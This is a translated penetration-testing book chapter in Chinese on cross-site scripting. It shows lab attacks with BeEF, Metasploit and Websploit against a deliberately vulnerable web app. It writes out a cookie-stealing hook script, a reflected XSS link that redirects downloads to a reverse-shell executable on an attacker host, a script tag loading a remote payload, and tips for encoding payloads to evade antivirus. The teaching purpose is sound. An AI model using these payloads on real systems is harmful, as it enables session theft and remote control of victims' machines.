## 第六章。通过跨站脚本攻击渗透会话

Web 应用程序的黑客攻击是一种独特的类别。虽然与网络和系统相关的黑客攻击侧重于在这些系统上获得持久存在或以其他方式修改它们的状态，但 Web 渗透测试侧重于愚弄服务器、客户端或两者以执行攻击者的命令。当然，你可以尝试攻击这些服务器或者妥协客户端或浏览器，但如果你可以在不建立永久住所的情况下从交换中得到你想要的一切，为什么不呢？注入攻击让许多 Web 开发人员非常紧张，就像对 Web 应用程序的绝地心灵攻击一样。通过挥动你的手（不是字面上的，实际上只是键盘上的一些努力），你可以说服服务器、客户端或两者以一种它们本来不会的方式行动。这可能是为了放弃数据（正如人们相信在 Impact Team 的 Ashley Madison 黑客攻击中发生的那样）或者用恶意脚本毒害一方或双方，违背客户端和服务器之间的信任。

**跨站脚本**（它可以缩写为**CSS**或**XSS**，但我们将使用后者以避免将此攻击与**层叠样式表**混淆）是你们许多人可能在实践中或通过自动化工具进行测试的一个非常深入的主题，但它是一个非常深入的主题，可能需要一本专门的书来证明。作为更广泛的注入攻击的子集，XSS 侧重于在不应该出现的地方使用 JavaScript。与广泛操纵劫持的请求和响应不同，XSS 在其中找到了插入秘密脚本的空间，否则这些脚本将无法着陆和执行。这些脚本现在对我们的目标和他们的用户来说是可信的，因为他们对彼此的信任，我们将利用这种信任关系来对付他们。

这些脚本的目的可以大不相同，但许多用途包括暴露 cookie 和会话信息，允许重定向和中间人攻击，劫持一个或两个端点进行其他攻击，甚至促进敏感数据的外泄。这些特征使它们极为危险，尽管它们在过去几个周期的 OWASP 十大中排名很高，但它们仍然是一个主要问题。

XSS 有许多应用，但在本章中，我们将区分 XSS 的类型，并提供一些关于如何在测试中最好地释放它们的选项。虽然 Burp 和 ZAP 可以提供一些 XSS 攻击，但了解如何制作我们自己的攻击并使用 Kali 中其他可用的工具来帮助传递它们是有帮助的。本章将讨论各种形式的 XSS，并展示我们可以使用这种强大的攻击形式来妥协我们的目标的其他方法。

在本章中，您将学到以下内容：

+   讨论各种形式的 XSS，如何检测它们的漏洞并利用它们

+   探索**存储**（也称为**持久性**）XSS 攻击的工作原理以及如何利用它们

+   使用社会工程技术理解和测试**反射**XSS

+   讨论其他工具的功能，如 BeEF、XSSer、Websploit 和 Metasploit，以及它们处理每种 XSS 攻击的能力

## XSS 类型的详细信息

* * *

XSS 攻击既常见又严重；在合适的地方，它们可以用于传递恶意脚本，将流量引导到替代重定向，或植入错误数据。对它们进行分类的努力为我们一些人增加了困惑。最早的分类侧重于其持久性（或缺乏持久性），但随着时间的推移，行业已经关注受影响的主机：Web 服务器或浏览客户端。OWASP 已经做了很好的工作，重新定义了这些类型，以帮助我们（渗透测试人员）为每种类型选择最佳的检测方法和利用工具。将它们联系在一起的共同点是它们都涉及用户输入被服务器中继而没有得到适当验证，这些攻击总是在浏览器中执行，无论传递方法如何。让我们回顾一下最新的分类，以便能够有效地使用它们。

### XSS 应该留下还是离开？

XSS 攻击，无论发生在哪里，都可以是存储型或反射型。根据意图和受影响会话的上下文，两者都可能从恼人到严重严重不等：

+   存储型 XSS 攻击（持久性）非常常见，攻击者伪装成合法用户的数据在呈现给其他用户之前未经适当筛选。这段代码将持续存在，直到被检测到、数据被清除，或者在 Web 服务上实施预防措施，以确保包含该代码的响应得到适当验证。实际上，该代码存储在服务器本身，如下所示：

![](img/B03918_06_01-1.png)

存储型 XSS 将攻击查看请求页面的任何客户端。

+   反射型 XSS 攻击（也称为非持久性）更加多样化，可以通过网络钓鱼活动、社会工程、中间人攻击或其他方式发起。无意中的用户通过点击带有脚本的恶意链接来发起攻击。攻击者精心制作他们的脚本，使其在受攻击的 Web 服务器的错误或搜索响应中返回或反射。因为攻击者说服用户点击嵌入脚本的链接，他们知道它将在响应中反射；可怜的客户端浏览器现在将信任该脚本，就好像它是从服务器本身发起的一样。实际上，受害者的浏览器发起了请求，如下截图所示：

![](img/B03918_06_02-1.png)

反射型或非持久性 XSS 往往更专注于一组用户。

### 位置，位置和位置！

我们区分 XSS 类型的第二种方法是通过位置。检测方法和防御对策可以根据被攻击的连接的哪一端而大不相同：客户端还是服务器：

+   服务器 XSS 攻击可能发生在服务器在响应客户端请求时提供恶意内容的情况下，因为在最初由另一个客户端输入时未经充分过滤或验证。这些攻击对客户端来说可能很困难，因为服务器将攻击与其 HTML 捆绑在一起，客户端的浏览器无法区分服务器的修改行为，因此忠实地呈现它，信任既定的又是植入的恶意代码。

+   另一方面，客户端 XSS 攻击侧重于在客户端自身设施内传递恶意代码或修改。其中最流行的形式是 DOM-based XSS，它针对浏览器中页面的状态机。大多数时候，当我们谈论客户端 XSS 时，我们指的是 DOM-based XSS。DOM-based XSS 攻击是客户端 XSS 的一个子集，它们利用了动态 Web 应用程序设计。在大多数现代 Web 应用程序中，浏览器在访问网站时会构建一个可以将 HTML 解析为树状对象的**文档对象模型**（**DOM**）。这种解析允许脚本语言（大多数时候我们在这里谈论 JavaScript，但其他 Web 内容如 HTML、ActiveX 和 Flash 也适用）动态修改表示树的 HTML 内容。DOM-based XSS 攻击尤其令人担忧，因为服务器可能永远不会在脚本中看到任何明显的问题。相反，服务器在不知情的情况下通过引用受害者本地的变量来帮助攻击者，而不知道这个变量是一些坏东西（比如重定向、挂钩文件等）。

### 注意

值得注意的是，服务器端和客户端 XSS 攻击都可以是存储型或反射型攻击。大多数值得携带的工具应该能够帮助扫描和利用大多数变种。

### XSS 的目标和交付

XSS 对 Web 应用程序及其用户构成的威胁是如此严重，但实施起来却非常容易。在大多数情况下，攻击者只需要了解 HTML 和 JavaScript 的基本知识，以及一个容易受到这种攻击形式影响的目标 Web 服务器。利用这些技能，黑客可以选择要覆盖的范围有多大。我们必须警惕所有形式的注入攻击，包括 XSS，因为它们都可能在事件响应开始修复这些问题之前对应用程序造成严重破坏。

对于存储型 XSS，黑客可以覆盖范围更广，影响大量用户的恶意脚本。如果应用程序的潜在用户主要在范围内，这是很好的，而且攻击更加直接，因为不需要社会工程来植入脚本。也就是说，正因为这些原因，存储型 XSS 必须谨慎使用。没有选择哪些受害者会报告，因此攻击者需要更多的开销来区分范围内和范围外的受害者。更广泛的潜在受众也对道德黑客的适用性提出了质疑，因为从附带受损主机中捕获数据的潜力非常高，客户可能会有需要解决的担忧。这使得存储型或持久型 XSS 攻击对许多人造成了严重伤害。

反射型 XSS 在前期投入的努力是非常值得的，因为钓鱼活动、有污染的链接或其他交付手段更精确，因此限制了附带损害。这也使黑客或测试人员能够专注于受影响的目标集，并几乎可以保证收集到的数据来自感兴趣的用户。虽然受害者的潜在损害与存储型 XSS 攻击相当，但受害者是有意的，因此这使得它更安全，也更值得投入努力。

## 眼见为实

* * *

在向客户报告网页应用程序漏洞存在时，大多数测试报告将显示扫描结果，仅识别漏洞可能存在（识别），还会进一步展示漏洞利用成功的确认（确认）。Arachni、ZAP、Burp Suite 和其他漏洞评估工具可以帮助进行识别。其中一些工具可以协助确认，但大多数测试人员会使用独立的 XSS 工具或方法来确认，以模仿黑客利用漏洞时的行为。快速搜索您喜爱的搜索引擎会发现一些领先的候选者，但我们将讨论最受欢迎的候选者，然后看看这些老牌工具如何帮助我们对目标进行测试。

### 不要使用 XSSer！

在 Kali 中用于 XSS 测试的最快速、直接的工具之一是 XSSer（有时发音为“scissor”）。作为一种工具，XSSer 只有一个功能，那就是测试网页应用程序上潜在 XSS 漏洞的存在，并提供快速、无争议的验证 URL 字符串来检查它们。XSSer 是那种可以让您以最少的知识获得强大功能的稀有工具；但在经验丰富的人手中，它可以被精确地定制。

您可以将 XSSer 用作 CLI 工具，也可以使用其 GUI 包装器，这是一种通过更直观的包装器构建 CLI 查询的好方法。要在 GUI 模式下使用 XSSer，您只需在终端会话中输入以下内容：

```
xsser â��gtk
```

XSSer 是一个用于运行针对网站的普通基于警报的测试脚本的良好工具，以确定它们的易受攻击性。话虽如此，我发现 XSSer 自从 2013 年发布最新版本以来就备受忽视，而这篇文章的撰写时间则是四年前，而且 Metasploit 也经历了几次修订。事实上，最新版本更适用于 Backtrack，但仍然提供了有用的向导和一些教育价值。然而，针对特定目标，我发现与更现代的工具相比，它既存在 bug 又应用受限。它值得一看，但我建议集中精力研究一些更全面的工具，比如 BeEF 和 Metasploit。

### BeEF 中的存储型 XSS

浏览器利用框架（BeEF，网址为[`beefproject.com`](http://beefproject.com/)）是我们在《使用树莓派进行渗透测试，第二版》中讨论过的工具，我们在那里讨论了它作为蜜罐或恶意网络服务器的一般用途。这些相同的功能使 BeEF 成为传递和随后管理各种 XSS 攻击的绝佳工具。BeEF 之所以强大，是因为它利用互联网浏览器中的单个钩子脚本进行攻击，由于 Web 服务器中的 XSS 漏洞，它可以规避大多数更偏执或训练有素的受害者采用的控制。除了完全阻止各种 HTML 数据类型之外，一个完美配置的客户端仍然可以运行，因为攻击者利用的是受害者的信任关系。

BeEF 在钩住受害者后，能够评估浏览器和操作系统组合的固有漏洞。根据这些发现，BeEF 提供了一系列可以启动的命令模块，例如截取屏幕截图、抓取凭据或外泄 cookie，甚至触发蜂鸣声。被钩住的系统只能在在线时访问。但是，一旦被钩住，BeEF 可以跟踪系统何时建立互联网连接，以继续对该系统发出命令。非常巧妙，也非常可怕！

为了展示这一点并帮助理解存储型 XSS 攻击的威力，我们将使用 BeEF 钩子脚本并将客户端指向我们 Kali 机器上的 BeEF 实例。下图显示了我们的测试场景，其中配置了以下内容：

+   **攻击者的机器**：Kali 虚拟机正在运行一个 BeEF 服务器，监听所有接口（172.16.30.128 是外部 IP 地址）

+   **Web 服务器/应用程序**：OWASP BWA 虚拟机，特别是 Mutillidae Web 应用程序

+   **客户端**：运行 Internet Explorer 10 的 Windows 7 虚拟机（评估副本）

攻击者可以在被钩住的受害者继续使用互联网的同时，从 Kali/BeEF 控制端远程执行命令模块，通常对被攻击者毫不知情。在实际攻击或黑盒攻击中，黑客往往会部署一个临时的 Kali 或类似的机器实例，并将其伪装在几层混淆（VPN、TOR、代理等）之后，以充当攻击机器，并使目标服务器上的归因或检测更加困难。无论攻击机器的位置如何，在存储型 XSS 中，易受攻击的服务器将继续帮助我们钩住我们的猎物。

![](img/B03918_06_03-1.png)

我们的 BeEF 存储型 XSS 场景

我们可以首先从 GUI 应用程序菜单、**`Favorites`**栏或通过导航到 BeEF 目录（`cd /usr/share/beef-xss`）然后使用`./beef`运行`beef`脚本来启动 BeEF-XSS。当它启动时，**`Terminal`**会话将向我们显示用户界面的一般 URL（红色的`UI URL`）和我们想要用来钩住猎物的脚本（蓝色的`Hook`），如下所示：

![](img/B03918_06_04-1.png)

BeEF 的启动过程告诉我们如何管理实例以及如何钩住浏览器。

BeEF 将自动启动一个浏览器会话，您可以使用*beef*的用户名和密码登录。当它首次启动时，在线和离线浏览器列表将为空。我们将打开一个新标签并以攻击者的身份访问*Mutillidae Web Application*，在那里我们可以在一个肯定会被可怜的受害者看到的字段中输入我们的钩子脚本（**`OWASP 2013`** | **`A3 - 跨站脚本（XSS）`** | **`持久（二次顺序）`** | **`添加到您的博客`**），如下所示：

![](img/B03918_06_05-1.png)

Mutillidae 提供了一些我们可以用于存储型 XSS 的模拟表单。

我们将看到一个博客条目表单，在其中我们可以放置我们的钩子脚本（`<script src="img/hook.js"></script>`），然后点击**`Save Blog Entry`**按钮（如下图所示）：

![](img/B03918_06_06.png)

在 Web 应用的博客功能上种植我们的钩子脚本。

好的，让我们换个角色，打开我们那可怜的、毫无戒备的运行 IE 10 的 Windows 7 虚拟机！在 Windows 虚拟机上，我们将作为观察者访问博客 - 这里没有什么疯狂的。只需按照**`OWASP 2013`** | **`A3 - 跨站脚本（XSS）`** | **`持久（二次顺序）`** | **`查看某人的博客`**的路径，如下图所示，我们将要查看所有用户的输入。页面将显示我们所有的条目，包括我们匿名用户的包含脚本的输入。我们知道博客页面是易受攻击的，因为我们在第五章中看到它被识别为潜在的具有 XSS 脚本漏洞的测试（如下图所示）。在这里，我们知道服务器在将这些条目回显给后续受害者的响应之前没有验证这些条目的内容。

![](img/B03918_06_07.png)

从受害者网站浏览受影响的博客。

一旦我们导航到博客视图（如下图所示），我们将看到一个空白空间，匿名用户显然没有输入任何内容。此时，他们没有理由相信自己已经被黑客入侵或者暴露于恶意的 XSS 攻击。

![](img/B03918_06_08-1.png)

所有那些被浪费的潜力（脚本隐藏）都在一个非常棒的博客中。

我们的 Kali 盒子知道得更多；查看我们的 BeEF-XSS 框架的控制 UI，我们可以看到运行 IE 10 的 Windows 7 盒子已经签到并报到。因为浏览器在宣布它们可以和不能支持的方面非常有帮助，BeEF 对于我们刚刚钩住的受害者可以实现哪些黑客和技巧有一个很好的想法，在下面的截图中，我们看到我已经搜索了与*cookie*相关的命令，从**`Module Tree`**的**`Browser`** | **`Hooked Domain`**部分中选择了**`Get Cookie`**，并运行它以获取受害者浏览器和 Mutillidae Web 服务器之间正在使用的会话 Cookie。除了证明存在 XSS 漏洞之外，我们还可以使用其他有用的攻击，这些攻击可以帮助我们抓取社交媒体登录状态、安装的软件、浏览历史以及其他任何可以帮助我们更好地描述目标环境的东西。

![](img/B03918_06_09.png)

BeEF 附带了近 200 个模块，帮助我们将浏览器变成我们的扩展！

请记住，我们来这里是为了对 Web 应用进行渗透测试，而不是用户和整个环境。除非您还有红队类型的宪章，否则请避免在任何 Web 应用程序特定数据之外拉取任何内容。

### 这里，鱼鱼！

反射型 XSS 攻击遵循类似的故事，只是用户被雇用来通过欺骗他们传递脚本来帮助自己进行黑客攻击。攻击者的钓鱼或链接放置取代了基于表单的利用，确实需要一些工作。**钓鱼**涉及向潜在目标发送一个*诱饵*电子邮件或网页，希望他们相信他们的意图，并单击其中一个嵌入其中的恶意链接。钓鱼通常可以用于其他攻击（简单地重定向到钓鱼网站仍然非常流行），但将有针对性的垃圾邮件与使用合法站点的重定向结合起来，但使用恶意脚本，可能会非常恶劣。话虽如此，让我们讨论一些攻击者和我们渗透测试人员需要考虑的内容。

构建目标列表可能需要大量工作；事实上，目标列表是暗网黑客网站上的一项热门服务。在渗透测试中，使用诸如浏览器、Maltego 或社交媒体等工具进行 OSINT 和社会工程可以挽救一天，让我们能够利用收集到的信息来帮助我们评估我们追踪的是谁。在我们的测试中，应该考虑 IT 人员，所谓的*C-suite*高管（特别是**首席信息官**（**CIO**）、**首席信息安全官**（**CISO**）和任何其他与安全、运营、架构或应用开发相关的技术职位），以及与站点相关的任何其他人员。

### 注意

像俄罗斯黑客 2014 年对[`in.yahoo.com/?p=us`](https://in.yahoo.com/?p=us)进行的大规模黑客攻击（[`www.justice.gov/opa/press-release/file/948201/download`](https://www.justice.gov/opa/press-release/file/948201/download)）通常始于对已知员工的小规模钓鱼攻击，以及他们收到电子邮件的可信原因。在这种情况下，这些信息被用来帮助伪造 Cookie 并窃取超过 5 亿个帐户的访问权限。这对我们中的许多人来说并不好玩。

攻击者随后需要一个愿意的邮件中继或服务器，以允许将诱饵大规模发送给他们的目标。有一些服务是供雇佣的坏人使用的（例如，臭名昭著的垃圾邮件发送服务，如 Send-Safe），或者他们可能选择在合法基础设施上部署垃圾邮件机器人，或者更糟糕的是，攻击一个 Web 服务器，并将其变成基于 PHP 的电子邮件服务器或网关。最后一种方法特别恶劣，因为如果他们能够攻击目标公司的网络邮件服务，他们可以像完全合法一样运作。

现在，我们只需要诱饵！通过链接进行基于钓鱼的交付有助于限制不需要的目标获取，并且比其他引诱反射型 XSS 的方法（例如蜜罐网站和 MITM（使用 SET 等工具，见第三章*，通过目标侦察跟踪猎物））更容易脱离归因和附带损害。下面的截图显示了一个示例：

![](img/B03918_06_10.png)

用于测试员工的样本钓饵。这里的每个链接都有可能被污染。

### 注意

页面或电子邮件中的超链接、图形或任何交互式内容都可能成为有用的诱饵，当攻击特定的人或团队时，您在社交媒体上的努力将对您的成功率产生巨大影响。

### 让我们开始 Metasploiting

到目前为止，我们在本书中使用的许多工具都专注于 Web 应用程序，并且在评估网站可能存在的漏洞方面非常有用。在所有渗透测试领域中使用的更通用的工具之一，Metasploit ([`www.metasploit.com`](https://www.metasploit.com))，实际上提供了一些针对许多顶级 Web 应用程序漏洞的测试的巨大价值，包括 XSS。Metasploit 可能不需要介绍；很有可能您正在将其作为工作流程或方法论的重要部分。也就是说，它是一个框架，包含各种可扩展的侦察和扫描模块，用于填充主机和相应漏洞的数据库。这个数据库允许 Metasploit 进入利用阶段，其中可以主动启动利用或在某些情况下将其捆绑到用于基于文件的传递的有效载荷中。围绕 Metasploit 的社区非常活跃，实际上已经制作了数百个插件和模块，使 Metasploit 成为每个人最喜欢的基础渗透测试工具。

#### 构建您自己的有效载荷

在您的设备上使用 BeEF 甚至标准的 Web 服务器设施，您可以使用 Metasploit 的**meterpreter**功能来帮助您获得对受影响主机的 shell 访问权限。Meterpreter 是 Metasploit 可以传递到客户端的有效载荷，它可以在**动态链接库**（**DLLs**）中工作，以建立安全的隐秘通道，用于黑客与目标之间的通信；它为黑客提供了一个基于 Ruby 的 shell，可以用来执行黑客的命令。我们为什么要这样做？在攻击 Web 应用程序时，通过客户端环境的横向移动可以帮助我们真正获得立足点，compromise 受信任的主机，并找到我们可以用来运行补充任务的相邻服务器，比如邮件服务器，域控制器等。反射型 XSS 攻击是传递此脚本的绝佳方式。用户现在对附件非常警惕（花了他们很长时间！），因此将我们的 hook 文件和有效载荷混入一个不可见的脚本中，为我们提供了一个很好的方式来访问经过良好训练的受害者计算机。

为了做到这一点，我们将创建一个有效载荷，对其进行编码，以绕过传统的安全防御，将其托管在我们控制下的服务器上，然后围绕它编写一个脚本，用于 XSS，如下面截图所示。在这里同样适用社会工程学方法，但这给了我们另一种方式来 compromise 主机。浏览器控制很好，但 shell 访问更好！

![](img/B03918_06_11-1.png)

我们可以使用 Metasploit 作为我们的 C2 头端，甚至制作自定义有效载荷。

我们首先启动 Metasploit Framework 的**msfconsole**，并选择我们选择的有效载荷，这种情况下是 Meterpreter Reverse TCP 有效载荷。我们可以通过在`msf`提示符中输入`use payload/windows/shell/reverse_tcp`命令来实现这一点。**`quick show`**选项将帮助我们查看可以配置的内容，如下面的截图所示。与一般的利用一样，我们可以使用`show options`查看有效载荷的选项，并使用`-h`查看命令，以指导我们完成整个操作：

![](img/B03918_06_12.png)

创建有效载荷的初始阶段-设置选项..

Metasploit 可以为攻击生成不同的文件格式。它还可以确保某些字节不被使用（`x00`是一个普遍不可接受的字节，所以我们会将其去掉）。有效载荷工具还可以执行以下操作：

+   它可以填充或附加额外的字节（`-s`添加 NOP 滑块）

+   它可以使用除默认的 Ruby 之外的其他编程语言（例如`-t java`或`-t c`）

+   它可以应用编码器（显示编码器以查看它们，`-e <编码器>`更改编码器）

+   它可以迭代并编码多次（`-I <迭代次数>`）

所有这些都帮助 Metasploit 隐藏和模糊有效载荷，以成功逃避典型基于签名的反病毒程序。看到这是多么容易，人们就能理解为什么传统的防病毒产品无法抵御这些新的、变形的威胁。

### 注意

签名检测寻找攻击中的特定特征。如果发现您的攻击不起作用，请尝试以另一种方式对其进行编码，然后再次发送。在许多情况下，添加足够的填充、调整或其他操作将绕过检测，因为现在它看起来像一个新文件。其他技术包括将文件分成较小的文件或加密。

我们有很多选项可以修改和定制我们自己的有效载荷。现在，让我们省略`x00`字节，迭代 3 次，并将其导出为一个可执行文件供我们使用，如下图所示。

![](img/B03918_06_13.png)

Metasploit 有效载荷生成可以定制代码，可以练习绕过任何东西。

在我们的桌面上，现在有一个闪亮的新**.exe**，它将在 Windows 平台上运行并执行。现在社会工程学就派上用场了，这意味着我们可以将这个可执行文件命名为用户期望安装的内容，并将其包含在社会工程活动中。如果我们能说服 Windows 用户安装它，我们将获得对该系统的具有根访问权限的后门，假设一切都按预期运行。这个概念对于本章后面呈现的其他攻击示例可能会有用，我们的自定义恶意软件有效载荷可以发挥作用。

### 注意

我们选择交付方式故意平淡，取决于您打算的目标上的限制，您可能不得不放弃整洁的可执行方法，而选择更隐秘的路径，比如一个 Java 或 Python 脚本，以某种方式避免触发 Windows**用户访问控制**（**UAC**）或其他可能存在的看门狗。我也在 msfconsole 视图中完成了所有这些操作，因为我倾向于在那里花更多的时间。如果您发现自己启动 Metasploit 是为了创建有效载荷，您可以选择使用**msfvenom**。

#### 每个良好的有效载荷都需要一个处理程序

我们的有效载荷在执行时需要有东西可以交流，以防它感到孤独或难以控制。在 Metasploit 中，这个功能由**处理程序**提供。我们可以简单地为我们传递的有效载荷类型创建一个处理程序，这样做可以确保当我们访问系统时，我们在那里并且能够利用它。处理程序充当我们与目标的**命令和控制**（**C2**或**C&C**）连接，并为我们提供一个可以无限制地操纵目标的 shell 环境（如下图所示）：

![](img/B03918_06_14-1.png)

为我们的有效载荷设置处理程序。

通过快速的`exploit`命令，我们现在正在运行并准备接受来自我们新受害者的流量。现在，处理程序已经准备好，您的目标已经确定；这两个孩子应该见面了！现在，如果我有办法让用户相信我的文件就好了。嗯...

#### 敲定交易-提供 shell 访问

让我们将可执行文件放在 Kali VM 上一个快速而简单的 Apache web 服务器的默认文件夹中，并制作一个脚本发送给潜在目标，以传递一个反射的 XSS JavaScript，现在将受害者的浏览器指向下载可执行文件。

这就是它的样子：

```
http://172.16.30.129/mutillidae/index.php?page=user-info.php&username= <script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");  AllLinks[0].href = "http://172.16.30.128/updater.exe"; }</script>
```

当我们将这个快速而肮脏的电子邮件发送到我的 Windows 7 虚拟机上，我们可以假设用户有超过 50%的机会看到`updater.exe`文件名，并将其与我信任的网络应用程序相关联，然后执行。在我们的 Kali 终端会话中观察到这一情况，我们得到了一个好消息，他们已经相遇并且现在联系上了！Meterpreter 现在作为我们的提示符，一个快速的`dir`命令显示了我们正在运行的目录的内容（如下图所示）。很明显，我们现在已经进入了 Windows 机器的内部；但是我们可以从这里做些什么呢？

![](img/B03918_06_15-1.png)

恭喜，我们现在有了远程 shell 访问！

Meterpreter 非常强大；有了这个访问权限，你现在可以在不被对方知晓的情况下管理受害者的计算机。以下是在我们的网络应用程序渗透测试中可能有用的一些东西：

+   转储哈希并操纵或窃取 cookie

+   秘密或公开地使用系统网络摄像头和麦克风

+   进行键盘记录

+   上传、下载、编辑、删除、创建、移动和搜索文件和目录

+   杀死或生成进程，修改注册表，或关闭/重新启动/休眠机器

+   查看网络和代理配置并配置端口转发

+   查看系统和用户信息并提升权限

总的来说，这是一些可怕的东西，应该清楚地认识到网络应用程序有责任确保他们不会让他们的用户陷入这种境地。

如果我们遇到更新的浏览器或者更加防御严密的主机，这种简单的基于 exe 的利用可能不会有太大作用。通过更高级的 Metasploit 功能、创造性的有效负载，甚至是无文件利用的熟练使用，这些防御措施通常可以被规避。

### Metasploit 的以网络为焦点的表亲——Websploit

Metasploit 的扫描和利用能力范围令人震惊，通过插件和模块的开放扩展，它获得了当之无愧的多功能和强大的声誉。然而，有时你可能在寻找一个网络应用程序的焦点，这就是一个名为**Websploit**（[`sourceforge.net/p/websploit/wiki/Home/`](https://sourceforge.net/p/websploit/wiki/Home/)）的类似开源框架发挥作用的地方。就像 Metasploit 一样，它提供了一个以命令行为重点的方法来调用和加载模块。它还共享了通过插件和模块的可扩展性，这些都帮助 Metasploit 保持在渗透测试工具的前沿，但它不是一个全包套件，它专注于我们作为网络渗透测试人员和道德黑客所特有的许多漏洞。

从他们的 Wiki 中列出的模块和插件清单可以很清楚地看出它的目的：

+   **Autopwn**：这是从 Metasploit 借来的，用于扫描和利用目标服务/服务器

+   **wmap**：这可以扫描或爬取从 Metasploit `wmap`插件借来的目标

+   **格式感染器**：将反向和 BIND 有效负载注入文件格式

+   **Phpmyadmin**：搜索目标的`phpmyadmin`登录页面

+   **lfi**：这可以扫描和绕过本地文件包含漏洞并绕过一些 WAF

+   Apache 用户：可以搜索服务器用户名目录（与 Apache web 服务器一起使用时）

+   **Dir Bruter**：使用单词列表对目标目录进行暴力破解

+   **管理员查找器**：搜索目标的管理员和登录页面

+   **MLITM 攻击**：中间人攻击，XSS 钓鱼攻击

+   **MITM**：中间人攻击

+   **Java 小程序攻击**：Java 签名小程序攻击

+   MFOD 攻击向量：毁灭之中指攻击向量

+   **USB 感染攻击**：为 Windows 创建可执行的后门以感染 USB

+   **ARP DOS**：随机 MAC 的 ARP 缓存拒绝服务攻击

+   **Web killer 攻击**：关闭网络上的网站（TCPKILL）

+   **假更新攻击**：可以为目标操作系统创建一个假的更新页面

+   **假接入点攻击**：可以创建假的接入点并窃取受害者的信息

由于本章主要讨论 XSS，DOM-based **Man Left in the Middle** (**MLITM**)攻击是我们要使用的工具，所以让我们看看如何利用这个模块。您需要下载最新版本，从 tarball 中提取出来，然后使用安装脚本。

一旦我们安装好了，我们可以简单地从终端会话中调用`websploit`命令，它就会启动 Websploit。从这里，我们将使用 network/mlitm。就模块而言，MLITM 工具再简单不过了。没有需要考虑的选项，因为基本上这个模块包括一个监听 Web 服务器（类似于处理程序）和一个充当默认有效载荷的 Python 模块（`thebiz.py`）。您当然可以制作其他有效载荷；但就像任何 XSS 攻击一样，我们的目标是将一个脚本放在用户信任的路径中，然后使用它将他们的浏览器重定向到我们的攻击服务器，从那里可以安装这个有效载荷并进行信息或操作的编排。

我在这次攻击中使用的脚本非常简单；我们希望将受害者浏览器引入我们的 C2 服务器/攻击盒，并允许运行在默认端口`8000`上的 Web 服务器 Websploit 传递有效载荷并建立我们的通道：

```
<script src=http://172.16.30.128:8000></script>
```

我们将其放在之前使用过的相同博客条目字段上，然后在您知道之前，我们就有了一个不幸的受害者使用了那个链接（如下面的截图所示）：

![](img/B03918_06_16-1.png)

脚本输入和受害者的外观 - 简单而有效。

在我们的 Kali 盒子上，我们可以看到我们正在传递有效载荷，并通过引用链接看到用户的流量，正如我们在下面的截图中开始看到的那样。从这里，您可以随意尝试有效载荷的修改，并实现其他工具中所见的一些控制。

![](img/B03918_06_17-1.png)

Websploit 提供了一个简单而有效的监听和有效载荷传递服务。

Websploit 在攻击链的其他领域是一个强大的工具，并且在 AutoPwn、DoS 和其 WiFi-focused 攻击等混合攻击模块方面表现良好。对于 XSS，我发现 Metasploit 在管理有效负载和提供 shell 选项方面更具多样性。除了 Meterpreter 之外，还有十多种其他 shell 选项，具体取决于您的目标可以逃脱多少，以及所需的隐蔽性和功能性的混合。

## 总结

* * *

自从动态内容的爆炸性增长将 JavaScript 带入 Web 开发的前沿以来，XSS 攻击一直是安全专业人员和数百万受害者的一大难题。再加上建立信任的过时手段（基于实体而没有对输入进行验证），这使得 XSS 成为了 OWASP 十大漏洞之一已经超过 10 年。很明显，应该采取一些措施来引起更多关注，而增加渗透测试的使用可以做出改变。

XSS 的工具有很多，虽然我们在这里包括了一些更容易获取的 Kali 工具，但在准备撰写本章时，我意识到工具集经历了一些起伏；一些工具随着时间的推移已经不再受欢迎，而另一些似乎仍在继续使用。其中一些可能归因于企业赞助 - Rapid7 是维护和赞助 Metasploit 的关键参与者，而 XSSer 和 Websploit 都曾得到间歇性的支持。我鼓励尽可能深入研究这些工具和其他工具，以便更好地了解哪些工具应该放在您的工具箱中。至少应该有两种工具用于每个角色，具有不同的优势和重叠的功能，以帮助更好地覆盖边缘情况。

在本章中，我们涵盖了 XSS 的类型，它们对我们的危害或帮助的潜力（黑客术语表示能够随意妥协站点或目标），以及一些很好的方法来利用它们来获得对客户及其与服务器的关系的可见性。正如我们所看到的，XSS 可以为真正的黑帽攻击者提供一个邪恶的立足点，使他们能够操纵系统资源并监视他们的受害者。在 XSS 专注于利用客户端-服务器信任关系来妥协客户端的同时，我们的下一章将讨论客户端攻击以及我们如何利用同样的信任关系来控制或迫使服务器本身。这些攻击被广泛称为注入攻击，并涵盖了 Web 应用程序安全领域的一些热门话题，如 HTML、SQL、XML，甚至常常被忽视的 LDAP。在下一章的结尾，您将拥有一套攻击的坚实基础，以帮助发现大多数应用程序及其客户端中的关键数据泄漏和主机控制漏洞。我很高兴您能一直关注到这一步，让我们看看我们还能造成或预防更多的损害！
